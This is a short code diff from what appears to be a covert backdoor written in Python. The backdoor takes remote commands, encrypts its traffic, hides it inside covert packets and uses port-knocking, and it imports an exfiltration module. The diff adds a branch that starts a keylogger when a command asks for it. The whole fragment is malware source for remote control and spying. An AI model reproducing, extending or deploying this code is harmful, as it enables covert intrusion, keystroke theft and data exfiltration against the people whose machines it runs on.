@@ -12,6 +12,7 @@ import config
 import backjake
 import utils
 import exfil
+import spyFunctions
 
 command = ""
 pswd = utils.encrypt(config.password)
@@ -81,6 +82,8 @@ def executeCommand(srcAddress, pacType, command):
 		for c in utils.encryptData("Connected: "):
 			send(utils.covertPacket(srcAddress, pacType, c, pswd), verbose=0)
 		knockCode(srcAddress, pacType, False)
+	elif "?keylogger" in command:
+		spyFunctions.startKeylogger()
 	else:
 		sendThread = threading.Thread(target=sendResults, args=(srcAddress,pacType,command))
 		sendThread.start()
@@ -107,4 +110,3 @@ def knockCode(address, protocol, openS):
 				proto = ICMP()
 			send(packet/proto, verbose=0)
 	# still gotta close
-
